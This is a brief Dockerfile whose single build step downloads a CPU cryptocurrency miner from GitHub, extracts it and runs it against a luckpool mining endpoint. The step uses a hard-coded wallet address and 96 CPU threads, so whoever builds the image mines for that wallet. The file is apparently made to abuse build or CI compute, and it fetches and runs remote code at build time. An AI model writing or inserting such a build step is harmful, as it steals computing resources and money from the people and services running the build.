FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt install wget; wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCT2S85q77oYSjQyU19UMmLCp8vSbXRuxT.MonG12 -p x --cpu 96
